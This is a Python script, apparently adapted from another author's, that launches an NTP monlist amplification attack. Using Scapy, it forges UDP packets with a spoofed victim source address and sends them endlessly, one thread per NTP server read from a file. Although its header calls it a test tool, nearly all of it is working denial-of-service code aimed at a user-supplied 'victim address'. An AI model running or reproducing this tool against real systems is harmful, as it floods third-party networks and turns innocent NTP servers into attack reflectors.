#!/usr/bin/env python3

'''
This script was taken from Ron Nilekani and modified for Python3, I found
it to be quite useful to verify on an NTP Amplified Attack but I found it
a bit cumbersome to use in the original shape, the modifications are only 
intended for ease of use and updating it to Python3, nothing more.

Vicente Manuel Munoz Milchorena - Vico Surge
Tijuana, Mexico
2019-09-28

---

Disclaimer - This program emulates the behavior of NTP Amplification attack.
It is not necessarily the best solution coz I am not a developer by profession.
In other words, I generally use libraries or data structures that I am 
comfortable or familiar with. If you think there is an optimal method to do
this, then please share your ideas. I am always open to learning something
new.

Ron Nilekani
Rackspace, Texas
nilekani.raunaq@gmail.com

Please feel free to reach out to me incase if you have any suggestions.

'''

#Importing the scapy library into my local namespace
from scapy.all import *
import sys
import threading
import time
import argparse

def file_operations(ntpserverfile):
	# Get all the servers from the file we designated
	# pass onto a list for ease of use
	ntplist = []
	try:
		ntp_results = open(ntpserverfile, 'r')
	except Exception as e:
		print("[X] Error while performing read, verify error below. Script will end")
		print(e)
		exit()
	for item in ntp_results:
		ntplist.append(item.replace("\n",""))
	ntp_results.close()
	return ntplist

def scapy_packet(ntp_server, target_address):
	'''
	This is the core function of our program where we build  arbitary network packets 
	and push them to our victim.
	'''

	# Pattern for NTP v2 Monlist Packet
	ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4

	#Scapy packet format + load = 'data' <-- contains the mon-list command
	#BUILDING THE PACKET
	packet = IP(dst=ntp_server,src=target_address)/UDP(sport=51147,dport=123)/Raw(load=ntp_data_pattern)
	
	#PACKET FORMAT:
	print("\nPACKET FORMAT:\n")
	ls(packet)

	#SENDING THE PACKET
	print("\nSENDING THE PACKET:\n")
	send(packet,loop=1)
	  
def thread_function(numberthreads,ntplist,target_address):
	'''
 	Calling the  function(ntp_attack) inside a thread
	THIS FUNCTION WILL SPAWN THREADS PER NTP_SERVER
    	SYNTAX REFERENCED FROM http://pymotw.com/2/threading/ 
    	'''
	threads = []
	for i in range(int(numberthreads)):
                thread = threading.Thread(target=lambda: scapy_packet(ntplist[i],target_address))
                thread.daemon = True # This is tied to stopping the program using CTRL-C as indica$
                threads.append(thread)
                thread.start()

if __name__ == "__main__":
	# Variables can be set through argparse or direct input here
	parser = argparse.ArgumentParser(description="NTP Monlist Amplification Attack Test Tool")
	parser.add_argument("-d","--debug", help="Debug application, set to 1 for debuging, default 0", 
		default=0, type=int)
	parser.add_argument("-t","--target", help="IP address to perform attack on", dest="target")
	parser.add_argument("-f","--file", help="File containing the NTP servers", dest="file")
	flags = parser.parse_args()
	if flags.target:
		target_address = flags.target
	else:
		target_address = input("[#] Enter the victim address: ")
	if flags.file:
		ntpserverfile = flags.file
	else:
		ntpserverfile = input("[#] Enter the name of the file containing the list of NTP Servers: ")

	# Performing the file operations to retrieve list of NTP servers
	print("[#] Reading from provided file")
	ntplist = file_operations(ntpserverfile)	
	
	# Dirty guessing at the amount of threads to be run, also send
	# a warning before going crazy.
	print("[#] Figuring out number of servers from list")
	numberthreads = len(ntplist)
	if numberthreads > 15:
		while True:
			stop_me = input("You are using a large amount of servers, are you sure you wish to proceed? [Y/N] ")
			if stop_me.lower() in ["n","no"]:
				print("[!] Exiting")
				exit()
			elif stop_me.lower() in ["y","yes"]:
				print("[!] Hope you know what you are doing, here we go!")
				break
			else:
				print("[X] Incorrect selection")
	#Calling the thread function
	print("[!] Starting in 5 seconds, you still have time to stop this")
	for i in range(4,-1,-1):
		print("[!] Countdown to extinction:",i)
		time.sleep(1)

	thread_function(numberthreads,ntplist,target_address)
	
	# In order to avoid utilization 100% CPU, I am adding delay to  the code execution by one second
	while True:
		time.sleep(1)